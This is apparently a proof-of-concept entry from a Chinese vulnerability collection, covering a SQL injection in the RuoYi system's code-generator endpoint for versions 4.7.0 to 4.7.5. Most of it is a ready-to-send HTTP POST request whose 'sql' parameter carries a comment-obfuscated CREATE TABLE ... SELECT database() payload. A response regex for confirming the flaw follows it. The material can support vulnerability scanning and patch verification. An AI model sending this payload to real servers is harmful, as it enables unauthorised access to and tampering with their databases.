﻿# 若依RuoYi系统 sql注入4

> 更新时间：2024-01-15

> 漏洞编号：

> 漏洞说明：漏洞影响：4.7.0<x<4.7.5

> 漏洞特征：

> 验证脚本：HTTP

```
POST /tool/gen/createTable HTTP/1.1
accept: */*
Cookie: JSESSIONID=62627303-0fd9-45d8-be63-2fbcb8de6594
Connection: close
Content-type: application/x-www-form-urlencoded

sql=create/**/table/**/test/**/as/**/select/**/database()
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?syntax)(?=.*?error).*?$

> 上传文件定位：


> 验证文件来源：若依RuoYi系统 sql注入4.poc
